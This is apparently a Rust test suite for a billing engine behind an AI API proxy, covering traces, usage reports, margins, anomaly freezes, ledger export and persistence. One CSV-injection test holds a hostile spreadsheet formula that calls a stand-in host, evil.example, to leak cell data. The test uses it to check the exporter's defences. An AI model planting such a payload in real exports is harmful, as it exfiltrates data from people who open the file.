use billing::card::{Card, CardStatus};
use billing::engine::BillingEngine;
use billing::ledger::UsageTokens;
use billing::observability::{
    Announcement, AnnouncementLevel, AnomalyAction, AttemptRecord, RequestTrace, TraceStatus,
};
use billing::rate_card::BillingSettings;
use billing::reservation::ReservationEstimateParams;

#[test]
fn test_record_and_list_request_traces() {
    let engine = BillingEngine::new();

    let trace1 = RequestTrace {
        id: "tr-1".to_string(),
        card_id: "card-user-1".to_string(),
        ts: 1000,
        invocation_id: "inv-1".to_string(),
        exposed_model: "claude-3-5-sonnet".to_string(),
        status: TraceStatus::Success,
        ttft_ms: Some(250),
        tokens_per_second: Some(48.5),
        error_class: None,
        provider_id: Some("deepseek-direct".to_string()),
        input_tokens: 1200,
        output_tokens: 350,
        credits_charged: 25_000_000,
        provider_cost_micro_cny: 15_000,
        attempt_chain: vec![AttemptRecord {
            key_id: "k-1".to_string(),
            provider_id: "deepseek-direct".to_string(),
            success: true,
            error: None,
            latency_ms: 1200,
        }],
    };

    let trace2 = RequestTrace {
        id: "tr-2".to_string(),
        card_id: "card-user-2".to_string(),
        ts: 1010,
        invocation_id: "inv-2".to_string(),
        exposed_model: "deepseek-chat".to_string(),
        status: TraceStatus::Error,
        ttft_ms: None,
        tokens_per_second: None,
        error_class: Some("ProviderTimeout".to_string()),
        provider_id: Some("deepseek-direct".to_string()),
        input_tokens: 500,
        output_tokens: 0,
        credits_charged: 0,
        provider_cost_micro_cny: 0,
        attempt_chain: vec![AttemptRecord {
            key_id: "k-2".to_string(),
            provider_id: "deepseek-direct".to_string(),
            success: false,
            error: Some("Timeout".to_string()),
            latency_ms: 5000,
        }],
    };

    engine.record_trace(trace1);
    engine.record_trace(trace2);

    let all_traces = engine.list_traces(None, 10);
    assert_eq!(all_traces.len(), 2);

    let user1_traces = engine.list_traces(Some("card-user-1"), 10);
    assert_eq!(user1_traces.len(), 1);
    assert_eq!(user1_traces[0].id, "tr-1");
    assert_eq!(user1_traces[0].attempt_chain.len(), 1);
}

#[test]
fn test_daily_usage_aggregation_and_multi_day_reports() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-a", "group-pro-plus", 100_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    let params = ReservationEstimateParams::new(1000, 500);

    // Day 1 (ts = 1000)
    let _ = engine.reserve("card-a", "inv-d1", &params, 1000, 60);
    let tokens_d1 = UsageTokens {
        uncached_input_tokens: 1000,
        output_tokens: 500,
        cache_creation_tokens: 0,
        cache_read_tokens: 0,
    };
    let _ = engine.settle(
        "inv-d1",
        &tokens_d1,
        "gpt-4o",
        "openai-prov",
        "gpt-4o",
        1005,
    );

    // Day 2 (ts = 1000 + 86400 = 87400)
    let _ = engine.reserve("card-a", "inv-d2", &params, 87400, 60);
    let tokens_d2 = UsageTokens {
        uncached_input_tokens: 2000,
        output_tokens: 800,
        cache_creation_tokens: 0,
        cache_read_tokens: 0,
    };
    let _ = engine.settle(
        "inv-d2",
        &tokens_d2,
        "gpt-4o",
        "openai-prov",
        "gpt-4o",
        87405,
    );

    let daily_summaries = engine.get_daily_summary(None, None);
    assert_eq!(daily_summaries.len(), 2);
    assert_eq!(daily_summaries[0].requests_count, 1);
    assert_eq!(daily_summaries[0].input_tokens, 1000);
    assert_eq!(daily_summaries[0].output_tokens, 500);

    assert_eq!(daily_summaries[1].requests_count, 1);
    assert_eq!(daily_summaries[1].input_tokens, 2000);
    assert_eq!(daily_summaries[1].output_tokens, 800);
}

#[test]
fn test_cost_vs_revenue_gross_margin_dashboard() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-fin", "group-pro-plus", 200_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    // Set face value: 1 credit = 0.01 CNY (1 credit = 1_000_000 micro-credits)
    let settings = BillingSettings {
        credit_face_value_cny: 0.01,
        usd_cny_rate: 7.25,
        rate_updated_at_secs: 1000,
    };
    engine.update_settings(settings);

    let params = ReservationEstimateParams::new(5000, 1000);
    let _ = engine.reserve("card-fin", "inv-fin", &params, 1000, 60);
    let tokens = UsageTokens {
        uncached_input_tokens: 5000,
        output_tokens: 1000,
        cache_creation_tokens: 0,
        cache_read_tokens: 0,
    };
    let _ = engine.settle(
        "inv-fin",
        &tokens,
        "claude-sonnet-4.5",
        "anthropic-pool",
        "claude-3-5",
        1005,
    );

    let margin = engine.get_margin_dashboard(None, None);
    assert_eq!(margin.total_requests, 1);
    assert!(margin.total_credits_charged > 0);
    assert!(margin.revenue_micro_cny > 0);
    // Profit = Revenue - Provider Cost
    assert_eq!(
        margin.gross_profit_micro_cny,
        margin.revenue_micro_cny - margin.provider_cost_micro_cny
    );
    assert!(margin.gross_margin_percentage >= 0.0);
}

#[test]
fn test_model_cost_rankings() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-rank", "group-pro-plus", 200_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    let params = ReservationEstimateParams::new(2000, 500);

    let _ = engine.reserve("card-rank", "inv-r1", &params, 1000, 60);
    let _ = engine.settle(
        "inv-r1",
        &UsageTokens {
            uncached_input_tokens: 1000,
            output_tokens: 200,
            cache_creation_tokens: 0,
            cache_read_tokens: 0,
        },
        "expensive-model",
        "p1",
        "exp-1",
        1005,
    );

    let _ = engine.reserve("card-rank", "inv-r2", &params, 1010, 60);
    let _ = engine.settle(
        "inv-r2",
        &UsageTokens {
            uncached_input_tokens: 2000,
            output_tokens: 400,
            cache_creation_tokens: 0,
            cache_read_tokens: 0,
        },
        "cheaper-model",
        "p1",
        "cheap-1",
        1015,
    );

    let rankings = engine.get_model_cost_rankings(None, None);
    assert_eq!(rankings.len(), 2);
    let models: Vec<String> = rankings.iter().map(|r| r.model_id.clone()).collect();
    assert!(models.contains(&"expensive-model".to_string()));
    assert!(models.contains(&"cheaper-model".to_string()));
}

#[test]
fn test_provider_health_summary_metrics() {
    let engine = BillingEngine::new();

    // 2 successes, 1 error for prov-alpha
    engine.record_trace(RequestTrace {
        id: "t1".to_string(),
        card_id: "c".to_string(),
        ts: 100,
        invocation_id: "i1".to_string(),
        exposed_model: "m".to_string(),
        status: TraceStatus::Success,
        ttft_ms: Some(200),
        tokens_per_second: Some(50.0),
        error_class: None,
        provider_id: Some("prov-alpha".to_string()),
        input_tokens: 100,
        output_tokens: 50,
        credits_charged: 1000,
        provider_cost_micro_cny: 500,
        attempt_chain: vec![],
    });

    engine.record_trace(RequestTrace {
        id: "t2".to_string(),
        card_id: "c".to_string(),
        ts: 110,
        invocation_id: "i2".to_string(),
        exposed_model: "m".to_string(),
        status: TraceStatus::Success,
        ttft_ms: Some(400),
        tokens_per_second: Some(30.0),
        error_class: None,
        provider_id: Some("prov-alpha".to_string()),
        input_tokens: 100,
        output_tokens: 50,
        credits_charged: 1000,
        provider_cost_micro_cny: 500,
        attempt_chain: vec![],
    });

    engine.record_trace(RequestTrace {
        id: "t3".to_string(),
        card_id: "c".to_string(),
        ts: 120,
        invocation_id: "i3".to_string(),
        exposed_model: "m".to_string(),
        status: TraceStatus::Error,
        ttft_ms: None,
        tokens_per_second: None,
        error_class: Some("InternalError".to_string()),
        provider_id: Some("prov-alpha".to_string()),
        input_tokens: 100,
        output_tokens: 0,
        credits_charged: 0,
        provider_cost_micro_cny: 0,
        attempt_chain: vec![],
    });

    let health = engine.get_provider_health("prov-alpha");
    assert_eq!(health.total_requests, 3);
    assert_eq!(health.success_requests, 2);
    assert_eq!(health.error_requests, 1);
    assert!((health.success_rate - 66.666).abs() < 0.1);
    assert_eq!(health.avg_ttft_ms, Some(300.0)); // (200 + 400) / 2
    assert_eq!(health.avg_tokens_per_second, Some(40.0)); // (50 + 30) / 2
}

#[test]
fn test_usage_anomaly_detection_and_auto_freeze() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-spike", "group-pro-plus", 500_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    let now = 10_000;
    let params = ReservationEstimateParams::new(100_000, 50_000);
    // Massive usage spike: 100 credits in 1 minute
    engine
        .reserve("card-spike", "inv-spike", &params, now, 60)
        .unwrap();
    let _res = engine
        .settle(
            "inv-spike",
            &UsageTokens {
                uncached_input_tokens: 100_000,
                output_tokens: 50_000,
                cache_creation_tokens: 0,
                cache_read_tokens: 0,
            },
            "claude-sonnet-4.5",
            "p1",
            "claude-3-5",
            now + 5,
        )
        .unwrap();

    // Threshold = 4_000_000 micro-credits within 300 seconds
    let alert = engine.evaluate_card_spike(
        "card-spike",
        now + 10,
        300,
        4_000_000,
        AnomalyAction::AutoFrozen,
    );

    assert!(alert.is_some());
    let a = alert.unwrap();
    assert_eq!(a.card_id, "card-spike");
    assert_eq!(a.action_taken, AnomalyAction::AutoFrozen);

    // Verify card was automatically frozen
    let card = engine.get_card("card-spike").unwrap();
    assert_eq!(card.status, CardStatus::Frozen);
}

#[test]
fn test_announcements_downlink_and_expiry() {
    let engine = BillingEngine::new();

    let ann1 = Announcement::new(
        "ann-1",
        "Scheduled Maintenance",
        "Database maintenance scheduled tonight at 02:00 UTC",
        AnnouncementLevel::Info,
        1000,
    )
    .with_expiry(2000);

    let ann2 = Announcement::new(
        "ann-2",
        "Claude Upstream Degraded",
        "Anthropic API experiencing elevated error rates",
        AnnouncementLevel::Warning,
        1000,
    ); // No expiry

    engine.add_announcement(ann1);
    engine.add_announcement(ann2);

    // At t=1500, both are active
    let active_1500 = engine.list_active_announcements(1500);
    assert_eq!(active_1500.len(), 2);

    // At t=2500, ann-1 has expired
    let active_2500 = engine.list_active_announcements(2500);
    assert_eq!(active_2500.len(), 1);
    assert_eq!(active_2500[0].id, "ann-2");
}

#[test]
fn test_financial_reconciliation_export_csv_and_json() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-exp", "group-pro-plus", 100_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    let params = ReservationEstimateParams::new(500, 100);
    let _ = engine.reserve("card-exp", "inv-exp", &params, 1000, 60);
    let _ = engine.settle(
        "inv-exp",
        &UsageTokens {
            uncached_input_tokens: 500,
            output_tokens: 100,
            cache_creation_tokens: 0,
            cache_read_tokens: 0,
        },
        "gpt-4o",
        "prov-1",
        "gpt-4o",
        1005,
    );

    let csv = engine.export_ledger_csv(Some("card-exp"));
    assert!(csv.contains("id,card_id,ts,kind"));
    assert!(csv.contains("card-exp"));
    assert!(csv.contains("gpt-4o"));

    let json = engine.export_ledger_json(Some("card-exp")).unwrap();
    assert!(json.contains("card-exp"));
    assert!(json.contains("inv-exp"));
}

/// RFC 4180 cells of each line: quoted cells may hold commas and doubled quotes.
fn csv_rows(csv: &str) -> Vec<Vec<String>> {
    csv.lines()
        .map(|line| {
            let (mut cells, mut cell, mut quoted, mut chars) =
                (Vec::new(), String::new(), false, line.chars().peekable());
            while let Some(c) = chars.next() {
                match (c, quoted) {
                    ('"', true) if chars.peek() == Some(&'"') => {
                        cell.push('"');
                        chars.next();
                    }
                    ('"', _) => quoted = !quoted,
                    (',', false) => cells.push(std::mem::take(&mut cell)),
                    _ => cell.push(c),
                }
            }
            cells.push(cell);
            cells
        })
        .collect()
}

#[test]
fn a_client_supplied_field_can_neither_split_a_row_nor_run_as_a_formula() {
    let engine = BillingEngine::new();
    let mut card = Card::new("card-csv", "group-pro-plus", 100_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);
    let hostile = "=HYPERLINK(\"https://evil.example/?\"&A1,\"open\"),0,0,0";
    let params = ReservationEstimateParams::new(500, 100);
    engine
        .reserve("card-csv", hostile, &params, 1000, 60)
        .unwrap();
    engine
        .settle(
            hostile,
            &UsageTokens {
                uncached_input_tokens: 500,
                output_tokens: 100,
                cache_creation_tokens: 0,
                cache_read_tokens: 0,
            },
            "@model",
            "prov-1",
            "gpt-4o",
            1005,
        )
        .unwrap();

    let rows = csv_rows(&engine.export_ledger_csv(Some("card-csv")));
    assert!(rows.len() >= 2);
    for row in &rows {
        assert_eq!(row.len(), rows[0].len(), "{row:?}");
        for cell in row {
            assert!(
                !cell.starts_with(['=', '+', '@']),
                "{cell:?} would run as a formula"
            );
        }
    }
    let usage = rows
        .iter()
        .find(|row| row[4].contains("HYPERLINK"))
        .unwrap();
    assert!(
        usage[4].ends_with(hostile),
        "the id itself is kept: {:?}",
        usage[4]
    );
    // Numbers stay numbers for reconciliation.
    assert!(usage[7].parse::<u64>().is_ok() && usage[9].parse::<i64>().is_ok());
}

#[test]
fn test_data_retention_pruning_policy() {
    let engine = BillingEngine::new();

    let make_trace = |id: &str, ts: u64| RequestTrace {
        id: id.to_string(),
        card_id: "c".to_string(),
        ts,
        invocation_id: id.to_string(),
        exposed_model: "m".to_string(),
        status: TraceStatus::Success,
        ttft_ms: None,
        tokens_per_second: None,
        error_class: None,
        provider_id: None,
        input_tokens: 0,
        output_tokens: 0,
        credits_charged: 0,
        provider_cost_micro_cny: 0,
        attempt_chain: vec![],
    };

    engine.record_trace(make_trace("t1", 1000));
    engine.record_trace(make_trace("t2", 2000));
    engine.record_trace(make_trace("t3", 3000));

    assert_eq!(engine.list_traces(None, 10).len(), 3);

    // Prune records older than cutoff 2500 (removes t1 at 1000 and t2 at 2000)
    let pruned = engine.prune_traces(2500);
    assert_eq!(pruned, 2);

    let remaining = engine.list_traces(None, 10);
    assert_eq!(remaining.len(), 1);
    assert_eq!(remaining[0].id, "t3");
}

#[test]
fn retry_history_survives_single_settlement_and_final_delivery_error() {
    let engine = BillingEngine::new();
    let mut card = Card::new("retry-card", "group-pro-plus", 100_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);
    engine
        .reserve(
            "retry-card",
            "retry-inv",
            &ReservationEstimateParams::new(1000, 500),
            1000,
            60,
        )
        .unwrap();
    for (index, success) in [false, true].into_iter().enumerate() {
        engine.record_trace(RequestTrace {
            id: format!("attempt-{index}"),
            card_id: "retry-card".into(),
            ts: 1000,
            invocation_id: "retry-inv".into(),
            exposed_model: "gpt-4o".into(),
            status: if success {
                TraceStatus::InProgress
            } else {
                TraceStatus::Error
            },
            ttft_ms: None,
            tokens_per_second: None,
            error_class: None,
            provider_id: Some("provider".into()),
            input_tokens: 0,
            output_tokens: 0,
            credits_charged: 0,
            provider_cost_micro_cny: 0,
            attempt_chain: vec![AttemptRecord {
                key_id: format!("key-{index}"),
                provider_id: "provider".into(),
                success,
                error: if success {
                    None
                } else {
                    Some("http_503".into())
                },
                latency_ms: 10,
            }],
        });
    }
    assert_eq!(engine.invocation_attempts("retry-inv"), 2);
    let tokens = UsageTokens {
        uncached_input_tokens: 10,
        output_tokens: 5,
        cache_creation_tokens: 0,
        cache_read_tokens: 0,
    };
    engine
        .settle("retry-inv", &tokens, "gpt-4o", "provider", "gpt-4o", 1005)
        .unwrap();
    let balance = engine.get_card("retry-card").unwrap().available_credits();
    let _ = engine.settle("retry-inv", &tokens, "gpt-4o", "provider", "gpt-4o", 1006);
    assert_eq!(
        engine.get_card("retry-card").unwrap().available_credits(),
        balance
    );
    assert_eq!(engine.invocation_attempts("retry-inv"), 2);
    engine.finish_trace("retry-inv", TraceStatus::Error, Some("stream_incomplete"));
    let traces = engine.list_traces(Some("retry-card"), 10);
    assert_eq!(traces.len(), 1);
    assert_eq!(traces[0].attempt_chain.len(), 2);
    assert_eq!(traces[0].status, TraceStatus::Error);
    assert!(traces[0].credits_charged > 0);
}

#[test]
fn reports_saturate_instead_of_wrapping_on_extreme_entries() {
    use billing::ledger::{LedgerEntry, LedgerKind};
    use billing::observability::{compute_margin_dashboard, compute_model_cost_rankings};
    let entry = |id: &str| LedgerEntry {
        id: id.into(),
        card_id: "card".into(),
        kind: LedgerKind::Usage,
        invocation_id: None,
        exposed_model: "model".into(),
        provider_id: "provider".into(),
        target_model: "target".into(),
        input_tokens: u64::MAX,
        output_tokens: u64::MAX,
        cache_creation_tokens: 0,
        cache_read_tokens: 0,
        credits_charged: i64::MAX,
        provider_cost_micro_cny: i64::MAX,
        rate_card_version: None,
        ts_secs: 1,
        operator_id: None,
        reason: None,
    };
    let entries = [entry("a"), entry("b")];
    let settings = BillingSettings {
        credit_face_value_cny: 0.01,
        usd_cny_rate: 7.25,
        rate_updated_at_secs: 1,
    };

    let margin = compute_margin_dashboard(&entries, &settings);
    assert_eq!(margin.total_credits_charged, i64::MAX);
    assert_eq!(margin.provider_cost_micro_cny, i64::MAX);
    assert!(
        margin.gross_profit_micro_cny <= 0,
        "a loss, not a wrapped profit"
    );

    let rankings = compute_model_cost_rankings(&entries, &settings);
    assert_eq!(rankings.len(), 1);
    assert_eq!(rankings[0].total_tokens, u64::MAX);
    assert_eq!(rankings[0].provider_cost_micro_cny, i64::MAX);
}

#[test]
fn traces_ride_along_with_the_next_commit_instead_of_saving_on_their_own() {
    let dir = std::env::temp_dir().join(format!(
        "kiro-trace-commits-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("billing_state.json");
    let engine = BillingEngine::new();
    engine.set_persistence_path(&path);
    let mut card = Card::new("card-trace", "group", 100_000_000);
    card.status = CardStatus::Active;
    engine.upsert_card(card);

    let saves = engine.snapshot_sequence();
    engine.record_trace(RequestTrace {
        id: "trace-1".into(),
        card_id: "card-trace".into(),
        ts: 1000,
        invocation_id: "inv-trace".into(),
        exposed_model: "model".into(),
        status: TraceStatus::InProgress,
        ttft_ms: None,
        tokens_per_second: None,
        error_class: None,
        provider_id: None,
        input_tokens: 0,
        output_tokens: 0,
        credits_charged: 0,
        provider_cost_micro_cny: 0,
        attempt_chain: Vec::new(),
    });
    engine.finish_trace("inv-trace", TraceStatus::Success, None);
    assert_eq!(
        engine.snapshot_sequence(),
        saves,
        "a trace costs no save of its own"
    );

    // The next commit carries it.
    engine
        .reserve(
            "card-trace",
            "inv-next",
            &ReservationEstimateParams::new(10, 10),
            1000,
            60,
        )
        .unwrap();
    let restored = BillingEngine::new();
    restored.load_from_file(&path).unwrap();
    let traces = restored.list_traces(None, 10);
    assert!(traces
        .iter()
        .any(|t| t.invocation_id == "inv-trace" && t.status == TraceStatus::Success));
    let _ = std::fs::remove_dir_all(dir);
}
